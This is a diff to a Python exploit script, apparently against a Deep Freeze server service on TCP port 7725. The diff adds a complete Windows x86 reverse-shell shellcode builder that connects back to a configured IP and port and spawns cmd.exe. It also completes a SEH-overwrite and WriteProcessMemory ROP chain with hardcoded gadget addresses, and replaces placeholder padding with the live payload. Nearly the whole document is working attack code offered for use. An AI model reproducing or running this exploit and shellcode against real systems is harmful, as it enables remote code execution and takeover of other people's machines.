@@ -11,11 +11,25 @@
   ░  ░  ░     ░   ░ ░ ░ ░ ░ ▒    ░   ░  ░          ░░   ░   ░   ▒   ░  ░  ░   ░  ░░ ░
         ░           ░     ░ ░      ░    ░ ░         ░           ░  ░      ░   ░  ░  ░
                                     Written by: snowcra5h@icloud.com (snowcra5h) 2023
+    Installation:
+    $ pip install keystone-engine capstone rich numpy
+
+    Usage: 
+    $ python snowcra5h_deepfreeze_exploit.py
 """
 
 import socket, struct, ctypes
 
-bad_chars = [0, 0xa, 0xd, 0x2b, 0x25, 0x26, 0x3d]
+import ctypes, struct, numpy, argparse
+from keystone import *
+from capstone import *
+from rich.console import Console
+
+REVSHELL_IP = "127.0.0.1" # the ip for the shellcode to reverse connect to
+REVSHELL_PORT = "4444" # the port for the shellcode to reverse connect to
+
+TARGET_IP = "192.168.182.10" # the target
+TARGET_PORT = 7725 # the target port
 
 DEBUG       = False
 LOW_QWORD   = 1
@@ -23,6 +37,437 @@ HIGH_QWORD  = 0
 
 qword_9ED208 = [0, 0] # dq 009ed208 L1 ; global rand value
 
+KEY = 0xe # hash key for shellcode encryption
+
+class Sin:
+    def __init__(self, ip=None, port=None):
+        self.ip = ip
+        self.port = port
+        self.__sin_addr = ""
+        self.__sin_port = ""
+
+        if self.ip and self.port:
+            self.__to_sin_addr()
+            self.__to_sin_port()
+
+    def __to_sin_addr(self):
+        sin_addr = []
+        for block in self.ip.split("."):
+            sin_addr.append(format(int(block), "02x"))
+        sin_addr.reverse()
+        self.__sin_addr = "0x" + "".join(sin_addr)
+
+    def __to_sin_port(self):
+        sin_port = format(int(self.port), "04x")
+        self.__sin_port = "0x" + str(sin_port[2:4]) + str(sin_port[0:2])
+
+    def get_sin_addr(self) -> str:
+        return self.__sin_addr
+
+    def get_sin_port(self) -> str:
+        return self.__sin_port
+
+class ShellCode:
+    def __init__(self, ip, port):
+        self.__sin = Sin(ip, port)
+        self.__sin_addr = self.__sin.get_sin_addr()
+        self.__sin_port = self.__sin.get_sin_port()
+
+    def __ror_str(self, byte, count):
+        binb = numpy.base_repr(byte, 2).zfill(32)
+        while count > 0:
+            binb = binb[-1] + binb[0:-1]
+            count -= 1
+        return (int(binb, 2))
+
+    def __get_hash(self, esi):
+        edx = 0x00
+        ror_count = 0
+
+        for eax in esi:
+            edx = edx + ord(eax)
+            if ror_count < len(esi)-1:
+                edx = self.__ror_str(edx, KEY)
+            ror_count += 1
+
+        return edx
+
+    def get_reverse_shell(self, debug=False) -> str:
+        # kernel32.dll
+        TerminateProcess = self.__get_hash("TerminateProcess")
+        LoadLibraryA     = self.__get_hash("LoadLibraryA")
+        CreateProcessA   = self.__get_hash("CreateProcessA")
+
+        # ws2_32.dll
+        WSAStartup = self.__get_hash("WSAStartup")
+        WSASocketA = self.__get_hash("WSASocketA")
+        WSAConnect = self.__get_hash("WSAConnect")
+
+        if debug:
+            int3 = "int3"
+        else: 
+            int3 = ""
+
+        asm = [
+            " start:                                 ",
+           f"   {int3}                              ;",  #  debug
+            "   mov   ebp, esp                      ;",
+            "   add   esp, 0xfffff9f0               ;",  #   Avoid NULL bytes
+
+            " find_kernel32:                         ",
+            "   xor   ecx, ecx                      ;",  #   ECX = 0
+            "   mov   esi,fs:[ecx+30h]              ;",  #   ESI = &(PEB) ([FS:0x30])
+            "   mov   edx, 0xcafebabe               ;",  #
+            "   sub   edx, 0xcafebab2               ;",  #   EDX = 0Ch
+            "   mov   esi,[esi+edx]                 ;",  #   ESI = PEB->Ldr
+            "   mov   esi,[esi+1Ch]                 ;",  #   ESI = PEB->Ldr.InInitOrder
+
+            " next_module:                           ",  #
+            "   mov   ebx, [esi+8h]                 ;",  #   EBX = InInitOrder[X].base_address
+            "   mov   edx, 0xcafebabe               ;",
+            "   sub   edx, 0xcafeba9e               ;",  #   EDX = 20h
+            "   mov   edi, [esi+edx]                ;",  #   EDI = InInitOrder[X].module_name
+            "   mov   esi, [esi]                    ;",  #   ESI = InInitOrder[X].flink (next)
+            "   cmp   [edi+12*2], cx                ;",  #   (unicode) modulename[12] == 0x00? modulename[12] of kernel32.dll)
+            "   jne   next_module                   ;",  #   No: try next module.
+
+            " find_function_shorten:                 ",  #
+            "   je find_function_shorten_bnc        ;",  #  jump if ECX == 0
+
+            " find_function_ret:                     ",  #
+            "   pop esi                             ;",  #   POP the return address from the stack
+            "   mov   [ebp+0x04], esi               ;",  #   Save find_function address for later usage
+            "   je resolve_symbols_kernel32         ;",  #
+
+            " find_function_shorten_bnc:             ",  #   
+            "   call find_function_ret              ;",  #   Relative CALL with negative offset
+
+            " find_function:                         ",  #
+            "   pushad                              ;",  #   Save all registers. Base address of kernel32 is in EBX from (find_kernel32)
+            "   mov   eax, [ebx+0x3c]               ;",  #   Offset to PE Signature
+            "   mov   edi, [ebx+eax+0x78]           ;",  #   Export Table Directory RVA
+            "   add   edi, ebx                      ;",  #   Export Table Directory VMA
+            "   mov   ecx, [edi+0x18]               ;",  #   NumberOfNames
+            "   mov   edx, 0xcafebabe               ;",
+            "   sub   edx, 0xcafeba9e               ;",  #   EDX = 20h
+            "   mov   eax, [edi+edx]                ;",  #   AddressOfNames RVA
+            "   add   eax, ebx                      ;",  #   AddressOfNames VMA
+            "   mov   [ebp-4], eax                  ;",  #   Save AddressOfNames VMA for later
+
+            " find_function_loop:                    ",  #
+            "   jecxz find_function_finished        ;",  #   Jump to the end if ECX is 0
+            "   dec   ecx                           ;",  #   Decrement our names counter
+            "   mov   eax, [ebp-4]                  ;",  #   Restore AddressOfNames VMA
+            "   mov   esi, [eax+ecx*4]              ;",  #   Get the RVA of the symbol name
+            "   add   esi, ebx                      ;",  #   Set ESI to the VMA of the current symbol name
+
+            " compute_hash:                          ",  #
+            "   xor   eax, eax                      ;",  #   NULL EAX
+            "   cdq                                 ;",  #   NULL EDX
+            "   cld                                 ;",  #   Clear direction
+
+            " compute_hash_again:                    ",  #
+            "   lodsb                               ;",  #   Load the next byte from esi into al
+            "   test  al, al                        ;",  #   Check for NULL terminator
+            "   jz    compute_hash_finished         ;",  #   If the ZF is set, we've hit the NULL term
+           f"   ror   edx, {KEY}                    ;",  #   rotate right by 13
+            "   add   edx, eax                      ;",  #   Add the new byte to the accumulator
+            "   jne   compute_hash_again            ;",  #   Next iteration
+
+            " compute_hash_finished:                 ",  #
+            " find_function_compare:                 ",  #
+            "   cmp   edx, [esp+0x24]               ;",  #   Compare the computed hash with the requested hash
+            "   jnz   find_function_loop            ;",  #   If it doesn't match go back to find_function_loop
+            "   mov   edx, [edi+0x24]               ;",  #   AddressOfNameOrdinals RVA
+            "   add   edx, ebx                      ;",  #   AddressOfNameOrdinals VMA
+            "   push  eax                           ;",  #   Store EAX correction for bad character
+            "   xor   eax, eax                      ;",  #   EAX = 0 
+            "   mov   ax,  [edx+2*ecx]              ;",  #   Extrapolate the function's ordinal
+            "   mov   cx, ax                        ;",  #   CX = AX
+            "   pop   eax                           ;",  #   Restore EAX 
+            "   mov   edx, [edi+0x1c]               ;",  #   AddressOfFunctions RVA
+            "   add   edx, ebx                      ;",  #   AddressOfFunctions VMA
+            "   mov   eax, [edx+4*ecx]              ;",  #   Get the function RVA
+            "   add   eax, ebx                      ;",  #   Get the function VMA
+            "   mov   [esp+0x1c], eax               ;",  #   Overwrite stack version of eax from pushad
+            "   nop                                 ;",  #   nop for bad char
+        
+            " find_function_finished:                ",  #
+            "   popad                               ;",  #   Restore registers
+            "   ret                                 ;",  #
+
+            " resolve_symbols_kernel32:              ",
+           f"   push  {TerminateProcess}            ;",  #   TerminateProcess hash
+            "   call  dword ptr [ebp+0x04]          ;",  #   Call find_function
+            "   mov   [ebp+0x10], eax               ;",  #   Save TerminateProcess address for later usage
+    
+           f"   push  {LoadLibraryA}                ;",  #   LoadLibraryA hash
+            "   call  dword ptr [ebp+0x04]          ;",  #   Call find_function
+            "   mov   [ebp+0x14], eax               ;",  #   Save LoadLibraryA address for later usage
+    
+           f"   push  {CreateProcessA}              ;",  #   CreateProcessA hash
+            "   call  dword ptr [ebp+0x04]          ;",  #   Call find_function
+            "   mov   [ebp+0x18], eax               ;",  #   Save CreateProcessA address for later usage
+
+            " load_ws2_32:                           ",  #
+            "   xor   eax, eax                      ;",  #   Null EAX
+            "   mov   ax, 0x6c6c                    ;",  #   Move the end of the string in AX;
+            "   push  eax                           ;",  #   Push \0\0ll on the stack
+            "   push  0x642e3233                    ;",  #   Push d.23 on the stack
+            "   push  0x5f327377                    ;",  #   Push _2sw on the stack
+            "   push  esp                           ;",  #   Push ESP to have a pointer to the string
+            "   call  dword ptr [ebp+0x14]          ;",  #   Call EAX = LoadLibrary(TEXT("ws2_32.dll")); 
+            "   mov   ebx, eax                      ;",  #   Move the base address of ws2_32.dll to EBX
+
+            " resolve_symbols_ws2_32:                ",  #   proceed into the resolve_symbols_ws2_32 function
+           f"   push  {WSAStartup}                  ;",  #   WSAStartup hash
+            "   call  dword ptr [ebp+0x04]          ;",  #   Call find_function
+            "   mov   [ebp+0x1C], eax               ;",  #   Save WSAStartup address for later usage
+
+            " resolve_symbols_WSASocketA:            ",  
+           f"   push  {WSASocketA}                  ;",  #   WSASocketA hash
+            "   call  dword ptr [ebp+0x04]          ;",  #   Call find_function
+            "   push  edx                           ;",  #   Save EBX bad character
+            "   mov   edx, 0xcafebabe               ;",  # 
+            "   sub   edx, 0xcafeba9e               ;",  #   EDX = 20h
+            "   add   edx, ebp                      ;",  #   EDX = EBP + EDX
+            "   mov   [edx], eax                    ;",  #   Save WSASocketA address for later usage
+            "   pop   edx                           ;",  #   Restore EBX
+
+            " resolve_symbols_WSAConnect:            ",
+           f"   push  {WSAConnect}                  ;",  #   WSAConnect hash
+            "   call  dword ptr [ebp+0x04]          ;",  #   Call find_function
+            "   mov   [ebp+0x24], eax               ;",  #   Save WSAConnect address for later usage
+
+            " call_WSAStartup:                       ",  #
+            "   mov   eax, esp                      ;",  #   Move ESP to EAX; eax = &esp
+            "   mov   cx, 0x590                     ;",  #   Move 0x590 to CX; 
+            "   sub   eax, ecx                      ;",  #   Subtract CX from EAX to avoid overwriting the structure later; 
+                                                         #   because the space gets populated by the lpWSAData struct
+            "   push  eax                           ;",  #   Push lpWSAData
+            "   xor   eax, eax                      ;",  #   Null EAX
+            "   mov   ax, 0x0202                    ;",  #   Move version to AX
+            "   push  eax                           ;",  #   Push wVersionRequired
+            "   call dword ptr [ebp+0x1C]           ;",  #   Call WSAStartup
+
+            " call_WSASocketA:                       ",  #
+            "   xor   eax, eax                      ;",  #   Null EAX
+            "   push  eax                           ;",  #   Push dwFlags
+            "   push  eax                           ;",  #   Push g
+            "   push  eax                           ;",  #   Push lpProtocolInfo
+            "   mov   al, 0x06                      ;",  #   Move AL, IPPROTO_TCP
+            "   push  eax                           ;",  #   Push protocol
+            "   sub   al, 0x05                      ;",  #   Subtract 0x05 from AL, AL = 0x01
+            "   push  eax                           ;",  #   Push type
+            "   inc   eax                           ;",  #   Increase EAX, EAX = 0x02
+            "   push  eax                           ;",  #   Push af
+            "   xor   edx, edx                      ;",  #   Clear EDX for bad char 0x20
+            "   mov   edx, 0xcafebabe               ;",
+            "   sub   edx, 0xcafeba9e               ;",  #   EDX = 20h
+            "   add edx, ebp                        ;",  #   EDX = ebp + 0x20
+            "   call dword ptr [edx]                ;",  #   Call WSASocketA; returns descriptor or -1 in EAX
+    
+            " call_wsaconnect:                       ",  #
+            "   mov   esi, eax                      ;",  #   Move the SOCKET descriptor to ESI
+            "   xor   eax, eax                      ;",  #   Null EAX
+            "   push  eax                           ;",  #   Push sin_zero[]
+            "   push  eax                           ;",  #   Push sin_zero[]
+
+           f"   push  {self.__sin_addr}             ;",  #   Push sin_addr 
+           f"   mov   ax, {self.__sin_port}         ;",  #   Move the sin_port to AX
+            "   nop                                 ;",  #   avoid bad char in jmp
+            "   shl   eax, 0x10                     ;",  #   Left shift EAX by 0x10 bits
+            "   add   ax, 0x02                      ;",  #   Add 0x02 (AF_INET) to AX
+            "   push  eax                           ;",  #   Push sin_port & sin_family
+            "   push  esp                           ;",  #   Push pointer to the sockaddr_in structure
+            "   pop   edi                           ;",  #   Store pointer to sockaddr_in in EDI
+            "   xor   eax, eax                      ;",  #   Null EAX
+            "   push  eax                           ;",  #   Push lpGQOS
+            "   push  eax                           ;",  #   Push lpSQOS
+            "   push  eax                           ;",  #   Push lpCalleeData
+            "   push  eax                           ;",  #   Push lpCallerData
+            "   add   al, 0x10                      ;",  #   Set AL to 0x10
+            "   push  eax                           ;",  #   Push namelen
+            "   push  edi                           ;",  #   Push *name
+            "   push  esi                           ;",  #   Push s
+            "   call dword ptr [ebp+0x24]           ;",  #   Call WSAConnect
+
+            " create_startupinfoa:                   ",  #   Push the ESI register, holds our socket descriptor, three times
+            "   push  esi                           ;",  #   Push hStdError  ; basically does dup2
+            "   push  esi                           ;",  #   Push hStdOutput ; 
+            "   push  esi                           ;",  #   Push hStdInput  ; 
+            "   xor   eax, eax                      ;",  #   Null EAX   
+            "   push  eax                           ;",  #   Push lpReserved2
+            "   push  eax                           ;",  #   Push cbReserved2 & wShowWindow
+            "   mov   al, 0x80                      ;",  #   Move 0x80 to AL
+            "   xor   ecx, ecx                      ;",  #   Null ECX
+            "   mov   cl, 0x80                      ;",  #   Move 0x80 to CL
+            "   add   eax, ecx                      ;",  #   Set EAX to 0x100
+            "   push  eax                           ;",  #   Push dwFlags
+            "   xor   eax, eax                      ;",  #   Null EAX   
+            "   push  eax                           ;",  #   Push dwFillAttribute
+            "   push  eax                           ;",  #   Push dwYCountChars
+            "   push  eax                           ;",  #   Push dwXCountChars
+            "   push  eax                           ;",  #   Push dwYSize
+            "   push  eax                           ;",  #   Push dwXSize
+            "   push  eax                           ;",  #   Push dwY
+            "   push  eax                           ;",  #   Push dwX
+            "   push  eax                           ;",  #   Push lpTitle
+            "   push  eax                           ;",  #   Push lpDesktop
+            "   push  eax                           ;",  #   Push lpReserved
+            "   mov   al, 0x44                      ;",  #   Move 0x44 to AL; ?? sizeof(STARTUPINFOA) = 0x44 bytes;
+            "   push  eax                           ;",  #   Push cb
+            "   push  esp                           ;",  #   Push pointer to the STARTUPINFOA structure
+            "   pop   edi                           ;",  #   Store pointer to STARTUPINFOA in EDI
+
+            " create_cmd_string:                     ",  #
+            "   mov   eax, 0xff9a879b               ;",  #   Move 0xff9a879b into EAX ; 'exe'
+            "   neg   eax                           ;",  #   Negate EAX, EAX = 00657865; '.dmc'
+            "   push  eax                           ;",  #   Push part of the "cmd.exe" string
+            "   push  0x2e646d63                    ;",  #   Push the remainder of the "cmd.exe" string
+            "   push  esp                           ;",  #   Push pointer to the "cmd.exe" string
+            "   pop   ebx                           ;",  #   Store pointer to the "cmd.exe" string in EBX
+
+            " call_createprocessa:                   ",  #
+            "   mov   eax, esp                      ;",  #   Move ESP to EAX
+            "   xor   ecx, ecx                      ;",  #   Null ECX
+            "   mov   cx, 0x390                     ;",  #   Move 0x390 to CX
+            "   sub   eax, ecx                      ;",  #   Subtract CX from EAX to avoid overwriting the structure later
+            "   push  eax                           ;",  #   Push lpProcessInformation
+            "   push  edi                           ;",  #   Push lpStartupInfo
+            "   xor   eax, eax                      ;",  #   Null EAX
+            "   push  eax                           ;",  #   Push lpCurrentDirectory
+            "   push  eax                           ;",  #   Push lpEnvironment
+            "   push  eax                           ;",  #   Push dwCreationFlags
+            "   inc   eax                           ;",  #   Increase EAX, EAX = 0x01 (TRUE)
+            "   push  eax                           ;",  #   Push bInheritHandles
+            "   dec   eax                           ;",  #   Null EAX
+            "   push  eax                           ;",  #   Push lpThreadAttributes
+            "   push  eax                           ;",  #   Push lpProcessAttributes
+            "   push  ebx                           ;",  #   Push lpCommandLine
+            "   push  eax                           ;",  #   Push lpApplicationName
+            "   call dword ptr [ebp+0x18]           ;",  #   Call CreateProcessA
+
+            " call_terminate_process:                ",  #
+            "   xor   ecx, ecx                      ;",  #   Null ECX
+            "   push  ecx                           ;",  #   uExitCode
+            "   push  0xffffffff                    ;",  #   hProcess
+            "   call dword ptr [ebp+0x10]           ;",  #   Call TerminateProcess
+        ]
+        return "\n".join(asm)
+
+def encode_all(code, platform="x86"):
+    mode = KS_MODE_32 if platform == "x86" else KS_MODE_64
+    ks = Ks(KS_ARCH_X86, mode)
+
+    encoding, count = ks.asm(code)
+
+    instructions = list(encoding)       # Converting encoding to a list of integers
+    shellcode = bytearray(encoding)     # Converting encoding to a bytearray
+
+    return instructions, shellcode
+
+def decode_all(instructions, badchars, platform="x86"):
+
+    bad = []
+    # reformat the bad characters
+    chars = badchars.split(' ')
+    for c in chars:
+        bad.append(int(c, 16))
+
+    # now decode so we have the instructions and the shellcode
+    if platform == "x86":
+        md = Cs(CS_ARCH_X86, CS_MODE_32)
+    else:
+        md = Cs(CS_ARCH_X86, CS_MODE_64)
+
+    for i in md.disasm(bytes(instructions), 0x1000):
+        shellcode = ""
+        for b in i.bytes:
+            shellcode = shellcode + hex(b).replace("0x", "").rjust(2, "0") + " "
+            
+            address = hex(i.address)
+            address = "[white bold]" + address.ljust(8, " ") + "[/]"
+
+            if(i.mnemonic.startswith("call")):
+                mnemonic = i.mnemonic.ljust(7, " ")
+                op_str = i.op_str
+                op_str = op_str.ljust(40, " ")
+                mnemonic = "[green bold]%s[/]" % mnemonic
+                op_str = op_str.replace("[", "\[")
+                op_str = "[green bold]%s[/]" % op_str
+            else:
+                mnemonic = i.mnemonic.ljust(7, " ")
+                op_str = i.op_str
+                op_str = op_str.ljust(40, " ")
+                mnemonic = "[blue bold]%s[/]" % mnemonic
+                op_str = op_str.replace("[", "\[")
+                op_str = "[blue bold]%s[/]" % op_str
+
+        console = Console()
+        
+        colored_bytes, bad_flag = format_code(shellcode, bad)
+        console.print(address + mnemonic + op_str + "; " + colored_bytes)
+        if bad_flag:
+            console.print(f"[white bold]\nBad instruction found {colored_bytes}\nHit enter to continue or [Q]uit:")
+            if input("").upper() == "Q":
+                quit()
+
+def format_code(code, bad):
+    if code == "":
+        return ""
+    
+    nums = code.split(' ')
+    colored_byte = ""
+    bad_flag = False
+
+    for n in nums:
+        if n == '':
+            break
+        if int(n, 16) in bad:
+            colored_byte = colored_byte + "[red bold]" + n + '[/] '
+            bad_flag = True
+        else:
+            colored_byte = colored_byte + "[white bold]" + n + '[/] '
+
+    return (colored_byte, bad_flag)
+
+def get_revshell(ip: str, port: str, bad_chars="", debug=False, winbox=False) -> bytes:
+
+    sc = ShellCode(ip, port)
+    rev_shellcode = sc.get_reverse_shell(debug)
+
+    instructions, shellcode = encode_all(rev_shellcode)
+
+    if bad_chars != "":
+        decode_all(instructions, bad_chars)
+
+    if winbox:
+        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                ctypes.c_int(len(shellcode)),
+                ctypes.c_int(0x3000),
+                ctypes.c_int(0x40)
+        )
+
+        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+
+        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
+                                             buf,
+                                             ctypes.c_int(len(shellcode)))
+
+        print("Shellcode located at address %s" % hex(ptr))
+        input("...ENTER TO EXECUTE SHELLCODE...")
+
+        ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+                                                 ctypes.c_int(0),
+                                                 ctypes.c_int(ptr),
+                                                 ctypes.c_int(0),
+                                                 ctypes.c_int(0),
+                                                 ctypes.pointer(ctypes.c_int(0)))
+
+        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
+
+    return shellcode
 
 def get_seh_overwrite() -> bytes:
     offset_to_call = 3632
@@ -51,7 +496,6 @@ def get_seh_overwrite() -> bytes:
 
     return seh_chain
 
-
 def get_wpm_ropchain() -> bytes:
     """
         -------------------------------
@@ -65,12 +509,12 @@ def get_wpm_ropchain() -> bytes:
         -------------------------------
     """
     skeleton  = struct.pack("<L", 0x41414141) # WriteProcessMemory address
-    skeleton += struct.pack("<L", 0x42424242) # shellcode return address to return to after WriteProcessMemory is called
+    skeleton += struct.pack("<L", 0x00f56c00) # shellcode return address to return to after WriteProcessMemory is called
     skeleton += struct.pack("<L", 0xffffffff) # hProcess (pseudo Process handle)
-    skeleton += struct.pack("<L", 0x44444444) # lpBaseAddress (Code cave address)
+    skeleton += struct.pack("<L", 0x00f56c00) # lpBaseAddress (Code cave address)
     skeleton += struct.pack("<L", 0x45454545) # lpBuffer (shellcode stack address)
     skeleton += struct.pack("<L", 0x46464646) # nSize (size of shellcode)
-    skeleton += struct.pack("<L", 0x47474747) # lpNumberOfBytesWritten (writable memory address, i.e. !dh -a MODULE; address just past size value +0x4)
+    skeleton += struct.pack("<L", 0x0135fc40) # lpNumberOfBytesWritten (writable memory address, i.e. !dh -a MODULE; address just past size value +0x4)
     skeleton += b"\x90" * 36 # 36 bytes is the distance between our stub and where our ropchain continues.
 
     rop_gadgets = {
@@ -89,6 +533,7 @@ def get_wpm_ropchain() -> bytes:
         # get next skeleton offset gadgets
         "inc eax; ret;" : struct.pack("<L", 0x0044bd6c),
         "inc edx; ret; (0086bc16)" : struct.pack("<L", 0x0086bc16),
+        "inc esi; ret; (00587706)" : struct.pack("<L", 0x00587706),
 
         # mov skeleton address for arithmetic
         "mov eax, esi; pop esi; ret;" : struct.pack("<L", 0x5721a6),
@@ -99,33 +544,34 @@ def get_wpm_ropchain() -> bytes:
 
         # pop for arithmetic
         "pop eax; ret;" : struct.pack("<L", 0x004d76f4),
-        "pop ecx; ret;" : struct.pack("<L", 0x4a55fb),
+        "pop ecx; ret (4a55fb);" : struct.pack("<L", 0x4a55fb),
         "pop esi ; ret;" : struct.pack('<L', 0x4b7c19),
 
         # push for next skeleton address
         "push esp ; pop esi ; ret;" : struct.pack('<L', 0x5d13eb),
-        "push eax ; inc esp ; pop esi ; ret;" : struct.pack('<L', 0x525966),
         "dec esp; ret;" : struct.pack("<L", 0x0047aeff),
+        "push eax ; add al, 0x59 ; pop edx ; pop edi ; pop esi ; ret ; (75c91a)" : struct.pack("<L", 0x75c91a),
+        "sub al, 0x59; pop ebp ; ret; (42245b)" : struct.pack("<L", 0x42245b),
 
         # return to esp
-        "xchg esp, eax; ret;" : struct.pack("<L", 0x00441ec6),
+        "xchg esp, eax; ret; (00441ec6)" : struct.pack("<L", 0x00441ec6),
 
         # zero registers
         "xor edx, edx; xor eax, eax; ret; (007caa92)" : struct.pack("<L", 0x007caa92),
 
         # constant hardcoded
         "LoadLibraryAStub IAT (0135fbac)" : struct.pack("<L", 0x0135fbac),
-        "WPM Offset from &LoadLibraryAStub (fffe6290)" : struct.pack("<L", 0xfffe6290),
+        "KERNEL32!WriteProcessMemoryStub Offset to &LoadLibraryAStub (fffe6290)" : struct.pack("<L", 0xfffe6290),
         "relative nSize offset to WriteProcessMemory" : struct.pack("<L", (0xffffffec)), # -0x14
 	    "-size of shellcode" : struct.pack("<L", (0xfffffdf4)), # -524
         "junk" : struct.pack("<L", 0xdeadbeef),
 
         # variable hardcoded
-        "relative lpBuffer offset from shellcode" : struct.pack("<L", (0xfffffee0)), # -288
+        "relative lpBuffer offset from shellcode" : struct.pack("<L", (0xfffffd10)), # 752 
         "first shellcode address offset to be added" : struct.pack("<L", (0x77777878)), 
 	    "second shellcode address offset to be added" : struct.pack("<L", (0x88888888)), 
         "start of skeleton offset" : struct.pack("<L", (0xffffffb0 + 0xc)), # -68
-        
+
         # OLD
         "mov ecx, [ecx] ; mov [eax], ecx ; pop ebp ; ret;" : struct.pack("<L", 0x7cdbd5),
         "add eax, ecx ; pop ecx ; pop ebp ; ret ;" : struct.pack("<L", 0x476b06),
@@ -135,7 +581,7 @@ def get_wpm_ropchain() -> bytes:
     rop = skeleton + rop_gadgets["push esp ; pop esi ; ret;"]
     rop += rop_gadgets["mov eax, esi; pop esi; ret;"] # EAX = ESP
     rop += rop_gadgets["junk"] # junk in ESI 
-    rop += rop_gadgets["pop ecx; ret;"] # ECX = start of skeleton offset
+    rop += rop_gadgets["pop ecx; ret (4a55fb);"] # ECX = start of skeleton offset
     rop += rop_gadgets["start of skeleton offset"] # ECX = -68
     rop += rop_gadgets["add eax, ecx ; pop ecx ; pop ebp ; ret ;"] # EAX = start of skeleton
     rop += rop_gadgets["junk"]
@@ -158,7 +604,6 @@ def get_wpm_ropchain() -> bytes:
     # 0:065> ? 77738b20 - 77752890 
     # Evaluate expression: -105840 = fffe6290       (RVA)
 
-
     # 0:065> u 77738b20 - fffe6290                  (Offset)
     # KERNEL32!WriteProcessMemoryStub:
     # 77752890 8bff            mov     edi,edi
@@ -173,37 +618,62 @@ def get_wpm_ropchain() -> bytes:
     rop += rop_gadgets["pop eax; ret;"] # EAX = LoadLibraryAStub IAT
     rop += rop_gadgets["LoadLibraryAStub IAT (0135fbac)"] 
     rop += rop_gadgets["mov eax, dword ptr [eax]; ret; (006700c4)"] # EAX = &LoadLibraryAStub
-    rop += rop_gadgets["pop ecx; ret;"] # ECX = WPMOffset
+    rop += rop_gadgets["pop ecx; ret (4a55fb);"] # ECX = WPMOffset
     rop += rop_gadgets["KERNEL32!WriteProcessMemoryStub Offset to &LoadLibraryAStub (fffe6290)"]
     rop += rop_gadgets["sub eax, ecx; ret;"] # EAX = &WriteProcessMemoryStub
     rop += rop_gadgets["add edx, esi; ret; (0060cabf)"] # EDX = ESI = Start of skeleton
+    rop += rop_gadgets["mov dword ptr [edx], eax; ret; (00588a1a)"] # skeleton[0] = &KERNEL32!WriteProcessMemoryStub
 
+    # offset to lPbuffer
+    for _ in range(0, 16):
+        rop += rop_gadgets["inc edx; ret; (0086bc16)"]
 
-    # goal get ESI to EDX
-    # │   ├──   :: DFServerServiceUnpacked.exe
+    rop += rop_gadgets["mov eax, edx; ret; (0x005039bd)"]
+    rop += rop_gadgets["pop ecx; ret (4a55fb);"]
+    rop += rop_gadgets["relative lpBuffer offset from shellcode"]
+    rop += rop_gadgets["sub eax, ecx; ret;"]
+    rop += rop_gadgets["mov dword ptr [edx], eax; ret; (00588a1a)"]
 
+    # offset skeleton to nSize
+    rop += rop_gadgets["inc edx; ret; (0086bc16)"]
+    rop += rop_gadgets["inc edx; ret; (0086bc16)"]
+    rop += rop_gadgets["inc edx; ret; (0086bc16)"]
+    rop += rop_gadgets["inc edx; ret; (0086bc16)"]
 
-    # 0x40242a: pop edi ; ret ; (1 found)
-    # fffd4010
-    # 0x622fbc: add edi, esi ; ret ; (1 found)
+    rop += rop_gadgets["pop eax; ret;"]
+    rop += rop_gadgets["-size of shellcode"] 
+    rop += rop_gadgets["neg eax; ret;"]
+    rop += rop_gadgets["xchg ecx, eax; ret;"]
+    rop += rop_gadgets["mov eax, edx; ret; (0x005039bd)"]
+    rop += rop_gadgets["mov dword ptr [eax], ecx; ret;"]
+
+    # return to WPM
+    rop += rop_gadgets["pop ecx; ret (4a55fb);"]
+    rop += rop_gadgets["relative nSize offset to WriteProcessMemory"]
+    rop += rop_gadgets["add eax, ecx ; pop ecx ; pop ebp ; ret ;"]
+    rop += rop_gadgets["junk"]
+    rop += rop_gadgets["junk"]
+    rop += rop_gadgets["xchg esp, eax; ret; (00441ec6)"]
 
     return rop
 
 def get_shellcode() -> bytes:
     sc  = b"\x90" * 16
-    sc += b"A"*520
+    sc += get_revshell(REVSHELL_IP, REVSHELL_PORT)
     sc += b"\x90" * 16
 
     return sc
 
-
 def build_exploitchain(szmax_expchain) -> bytes:
     # create exploit chain
-   
+
+    size_of_ropchain = 0x300
+
     seh = get_seh_overwrite()
     rop = get_wpm_ropchain()
+    rop += b"A" * (size_of_ropchain - len(rop)) # we want our shellcode always at the same offset.
     shellcode = get_shellcode()
-   
+
     exploit_chain = seh + rop + shellcode
     sz_expchain = len(exploit_chain)
     padding = b'\x90' * (szmax_expchain - sz_expchain)
@@ -212,19 +682,16 @@ def build_exploitchain(szmax_expchain) -> bytes:
 
     return payload
 
-
 def seed_rng(seed_value):
     global qword_9ED208
     qword_9ED208[HIGH_QWORD] = seed_value
     qword_9ED208[LOW_QWORD] = 0
     return __get_next_rng()
 
-
 def __get_next_rng():
     global qword_9ED208
     qword_9ED208[HIGH_QWORD] = ctypes.c_uint32(qword_9ED208[HIGH_QWORD] * 0x15A4E35 + 1).value
     return (qword_9ED208[HIGH_QWORD] >> 16) & 0x7FFF
-
 
 def get_large_random():
     global qword_9ED208
@@ -263,7 +730,6 @@ def get_large_random():
     ESI = EBX = 0 # For debugging
     return EAX
 
-
 def decrypt_bytes(BUFFER_LEN, BUFFER, SEED_VALUE=0x037ba4d4):
     global EDX_GLOBAL
 
@@ -283,7 +749,6 @@ def decrypt_bytes(BUFFER_LEN, BUFFER, SEED_VALUE=0x037ba4d4):
             print(f'[{i:04}]: {hex(XOR_VAL)[2:]:02} ^ {hex(XOR_KEY)[2:]:02} = {hex(STORED_BUFFER[i])[2:]:02}')
 
     return bytes(STORED_BUFFER) # Convert back to bytes
-
 
 def generate_checksum_value(checkval):
     EBX = EDX = ECX = EAX = 0
@@ -307,7 +772,6 @@ def generate_checksum_value(checkval):
     EAX = ctypes.c_uint32(EAX | AX).value # ... test val
     return AX # retn
 
-
 def deobfuscate_buffer_with_checksum(initial_checksum, buffer, buffer_len) -> bytes:
     if buffer_len == 0:
         return buffer
@@ -321,7 +785,6 @@ def deobfuscate_buffer_with_checksum(initial_checksum, buffer, buffer_len) -> by
         buf[i] = ctypes.c_uint8(buf[i] ^ checksum).value
 
     return bytes(buf) # Convert back to bytes
-
 
 def ps_command_buffer_checksum(buffer, size):
     EBX = buffer # base pointer for memory addresses pointing to buffer 
@@ -343,7 +806,6 @@ def ps_command_buffer_checksum(buffer, size):
         EAX = ctypes.c_uint32(EAX&EDX).value # and eax, edx
 
     return ctypes.c_int32(EAX).value
-    
 
